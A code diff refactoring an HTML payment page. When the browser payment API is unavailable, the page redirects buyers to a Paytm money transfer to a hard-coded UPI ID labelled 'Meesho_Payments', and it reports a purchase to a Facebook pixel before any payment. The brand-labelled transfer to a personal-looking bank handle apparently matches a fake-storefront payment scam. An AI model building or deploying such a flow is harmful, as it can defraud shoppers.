@@ -1,12 +1,25 @@
-<button class="bg-black text-white font-bold py-2 px-4 rounded-lg mt-4 w-full" id="onBuyClicked">Continue</button>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Page</title>
+    <!-- Include SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+<body>
+    <button class="bg-black text-white font-bold py-2 px-4 rounded-lg mt-4 w-full" id="onBuyClicked">Continue</button>
 
-<script>
- function onBuyClicked(amount) {
-            fbq('track', 'Purchase', {currency: "USD", value: 30.00});
-             //gsap.to("#addToCartButton", { duration: 0.5, scale: 1.2, ease: "bounce" });
-            if (!window.PaymentRequest || isFacebookBrowser() || isSamsungBrowser() || isOperaMini() || isUCWebBrowser() || isIOS()) {
-                //alert('Web payments are not supported in this browser.');
-                 fallbackPayment(amount);
+    <script>
+        document.getElementById('onBuyClicked').addEventListener('click', function() {
+            onBuyClicked(30.00); // Example amount
+        });
+
+        function onBuyClicked(amount) {
+            fbq('track', 'Purchase', {currency: "USD", value: amount});
+
+            if (!window.PaymentRequest || isUnsupportedBrowser()) {
+                fallbackPayment(amount);
                 return;
             }
 
@@ -39,7 +52,7 @@
                 }],
             };
 
-            let request = null;
+            let request;
             try {
                 request = new PaymentRequest(supportedInstruments, details);
             } catch (e) {
@@ -52,29 +65,32 @@
                 return;
             }
 
-            var canMakePaymentPromise = checkCanMakePayment(request);
-            canMakePaymentPromise.then((result) => {
-                showPaymentUI(request, result);
+            checkCanMakePayment(request).then((result) => {
+                showPaymentUI(request, result, amount);
             }).catch((err) => {
                 alert('Error calling checkCanMakePayment: ' + err);
             });
         }
 
+        function isUnsupportedBrowser() {
+            return isFacebookBrowser() || isSamsungBrowser() || isOperaMini() || isUCWebBrowser() || isIOS();
+        }
+
         function checkCanMakePayment(request) {
             const canMakePaymentCache = 'canMakePaymentCache';
 
-            if (sessionStorage.hasOwnProperty(canMakePaymentCache)) {
-                return Promise.resolve(JSON.parse(sessionStorage[canMakePaymentCache]));
+            if (sessionStorage.getItem(canMakePaymentCache)) {
+                return Promise.resolve(JSON.parse(sessionStorage.getItem(canMakePaymentCache)));
             }
 
-            var canMakePaymentPromise = Promise.resolve(true);
+            let canMakePaymentPromise = Promise.resolve(true);
 
             if (request.canMakePayment) {
                 canMakePaymentPromise = request.canMakePayment();
             }
 
             return canMakePaymentPromise.then((result) => {
-                sessionStorage[canMakePaymentCache] = result;
+                sessionStorage.setItem(canMakePaymentCache, JSON.stringify(result));
                 return result;
             }).catch((err) => {
                 alert('Error calling canMakePayment: ' + err);
@@ -83,37 +99,35 @@
 
         function showPaymentUI(request, canMakePayment, amount) {
             if (!canMakePayment) {
-                
                 fallbackPayment(amount);
-                //alert('amount');
                 return;
             }
 
-            let paymentTimeout = window.setTimeout(function() {
+            const paymentTimeout = window.setTimeout(() => {
                 window.clearTimeout(paymentTimeout);
-                request.abort().then(function() {
+                request.abort().then(() => {
                     alert('Payment timed out.');
-                }).catch(function() {
+                }).catch(() => {
                     alert('Unable to abort, user is in the process of paying.');
                 });
             }, 20 * 60 * 1000);
 
-            request.show().then(function(instrument) {
+            request.show().then((instrument) => {
                 window.clearTimeout(paymentTimeout);
                 processResponse(instrument);
-            }).catch(function(err) {
+            }).catch((err) => {
                 alert(err);
             });
         }
 
         function processResponse(instrument) {
-            var instrumentString = JSON.stringify({
+            const instrumentString = JSON.stringify({
                 methodName: instrument.methodName,
                 details: instrument.details,
                 payerName: instrument.payerName,
                 payerPhone: instrument.payerPhone,
                 payerEmail: instrument.payerEmail,
-            }, undefined, 2);
+            }, null, 2);
 
             fetch('process_payment.php', {
                 method: 'POST',
@@ -131,47 +145,48 @@
 
             instrument.complete('success');
         }
-  // Fallback function for browsers that do not support PaymentRequest API
-function fallbackPayment(amount) {
-    const upiId = 'mab.037324028910060@axisbank'; // Replace with appropriate UPI ID or other payment details
-    const redirect_url = "paytmmp://cash_wallet?pa=mab.037324028910060@axisbank&pn=Meesho_Payments&am=" + amount + "&amp;cu=INR&tn=4520175&featuretype=money_transfer"
 
-    // Redirect the user to the UPI payment URL
-    window.location.href = redirect_url;
-}
+        function fallbackPayment(amount) {
+            const upiId = 'mab.037324028910060@axisbank';
+            const redirect_url = `paytmmp://cash_wallet?pa=${upiId}&pn=Meesho_Payments&am=${amount}&cu=INR&tn=4520175&featuretype=money_transfer`;
 
-// Function to detect if the user is in the Facebook in-app browser
-function isFacebookBrowser() {
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
-    return (ua.indexOf('FBAN') > -1) || (ua.indexOf('FBAV') > -1);
-}
+            window.location.href = redirect_url;
+        }
 
-// Function to detect if the user is using Samsung Internet browser
-function isSamsungBrowser() {
-    const ua = navigator.userAgent.toLowerCase();
-    return ua.indexOf('samsungbrowser') > -1;
-}
-// Function to detect if the user is using Opera Mini browser
-function isOperaMini() {
-    const ua = navigator.userAgent.toLowerCase();
-    return ua.indexOf('opera mini') > -1;
-}
+        function isFacebookBrowser() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            return ua.includes('FBAN') || ua.includes('FBAV');
+        }
 
-// Function to detect if the user is using UC Browser
-function isUCWebBrowser() {
-    const ua = navigator.userAgent.toLowerCase();
-    return ua.indexOf('ucbrowser') > -1;
-}
-function isIOS() {
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
-    return (/iPad|iPhone|iPod/.test(ua) && !window.MSStream);
-}
+        function isSamsungBrowser() {
+            return navigator.userAgent.toLowerCase().includes('samsungbrowser');
+        }
 
-    <!-- Include SweetAlert2 for alerts -->
-    
+        function isOperaMini() {
+            return navigator.userAgent.toLowerCase().includes('opera mini');
+        }
+
+        function isUCWebBrowser() {
+            return navigator.userAgent.toLowerCase().includes('ucbrowser');
+        }
+
+        function isIOS() {
+            return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+        }
+
+        // Define fetchUpiID and setRechargeOnClick if they are required
+        function fetchUpiID() {
+            // Placeholder function; implement according to your needs
+            return Promise.resolve('some-upi-id');
+        }
+
+        function setRechargeOnClick(upiID) {
+            // Placeholder function; implement according to your needs
+            console.log('UPI ID set:', upiID);
+        }
+
         // Fetch UPI ID and set up the onclick handlers
         fetchUpiID().then(upiID => setRechargeOnClick(upiID));
-</script>
-
-<!-- Include SweetAlert2 for alerts -->
-<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    </script>
+</body>
+</html>
